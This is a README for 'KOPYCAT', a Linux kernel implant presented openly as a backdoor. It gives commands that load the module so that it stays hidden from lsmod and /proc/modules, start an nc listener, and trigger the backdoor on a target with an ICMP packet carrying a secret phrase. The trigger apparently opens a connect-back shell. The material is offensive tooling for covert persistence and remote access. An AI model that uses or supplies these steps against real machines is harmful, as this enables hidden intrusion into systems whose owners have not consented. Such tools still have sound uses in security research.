# 0

KOPYCAT - Linux Kernel module-less implant (backdoor)

# Usage

~~~
$ make
$ sudo insmod kopycat.ko
insmod: ERROR: could not insert module kopycat.ko: Inappropriate ioctl for device
$ lsmod | grep kopycat
$ cat /proc/modules | grep kopycat
~~~

Launch `nc` listener:
~~~
$ nc -l 8087
~~~

Trigger the backdoor by sending ICMP packet with secret phrase:
~~~
$ sudo hping3 -c 1 -j -1 -e black-magic-test <target>
~~~

# Author

[Ilya V. Matveychikov](https://github.com/milabs)

2021
